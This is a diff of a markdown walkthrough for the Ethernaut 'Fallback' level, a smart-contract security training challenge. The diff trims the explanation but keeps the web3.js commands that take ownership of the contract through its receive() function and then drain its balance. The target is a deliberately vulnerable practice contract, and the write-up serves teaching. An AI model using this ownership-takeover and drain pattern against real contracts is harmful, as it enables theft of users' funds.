@@ -1,6 +1,10 @@
-# 2. Fallback
+---
+description: fallback() function and receive() function
+---
 
-Ethernaut2: [Fallback](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)
+# 1 - Fallback
+
+Ethernaut Level1: [Fallback](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -54,13 +58,13 @@ contract Fallback {
 
 <details>
 
-<summary>Key  for this problem  🔑</summary>
+<summary>Key to solve this problem  🔑</summary>
 
 using `recieve` function
 
 </details>
 
-## You must know before
+### What you should know before
 
 * Sending transactions using `web3.js` **** \
   ****-> see [here](https://stackoverflow.com/questions/52740950/how-to-send-wei-eth-to-contract-address-using-truffle-javascript-test)
@@ -69,26 +73,15 @@ using `recieve` function
 
 ## Walkthrough
 
-{% hint style="info" %}
-Don't forget!
-
-Not only do we need to claim **ownership** of the contract, but also we have to **reduce** the **balance** of the contract to `0`!\
-\
-We first will modify the value of`owner` variable, and then we will **drain** the contract.
-{% endhint %}
-
 ### 1. Claming Ownership
-
-We first have to modify the value of `owner` variable.
-
-Let's see which functions modify `owner` variable.
 
 ```solidity
 function contribute() public payable {
   require(msg.value < 0.001 ether);
-  contributions[msg.sender] += msg.value;
+  contributions[msg.sender] += msg.value; // here
   if(contributions[msg.sender] > contributions[owner]) {
-    owner = msg.sender; // here
+    // can't reach here because of require statement
+    owner = msg.sender; 
 }
 ```
 
@@ -99,61 +92,19 @@ receive() external payable {
 }
 ```
 
-#### 1) `contribute()` function
-
-Let's check out `contribute` function first.
-
-To modify the value of `owner` variable, we must contribute more than the original owner did.
-
-Let's check how much he contributed!
-
-```javascript
-const owner = await contract.owner();
-
-await contract.contributions(owner).then((v) => v.toString());
-
-// '1000000000000000000000'
-```
-
-Wow, `1000 ETH`!
-
-It seems even if we have more than `1000 eth`, we won't be  able to pass the require statement.
-
-Let's check out `receive` function for next.
-
-#### &#x20;&#x20;
-
-#### 2) `receive()` function
-
-`receive()` function is checking if msg.sender sent over `0 wei`  and if he contributed more then `0 wei`.
-
-Seems we can use both to solve the problem!
-
-#### &#x20; &#x20;
-
-#### 3) Let's claim the ownership!
+#### 1) contribution
 
 ```javascript
 // You can send any value between 0 and 0.001 ether
 await contract.contribute({ value: 3 });
 ```
 
-Here we can make our contribution to be bigger than `0`.
-
-Now, let's modify `owner` variable.
+#### 2) receive() function
 
 ```javascript
 // Here, since there's no require statement,
 // you can send any value bigger than 0.
 await contract.sendTransaction({ value: 3 });
-```
-
-Because `receive()` function only checks if `msg.value` is bigger than 0 wei and if `msg.sender` contributed more than 0 wei, we can easily satisfy both conditions.
-
-Let's check if it works 😎
-
-```javascript
-await contract.owner();
 ```
 
 &#x20;&#x20;
@@ -179,4 +130,6 @@ await web3.eth.getBalance(contract.address); // 0
 ```
 
 Done! 😎
+
+
 
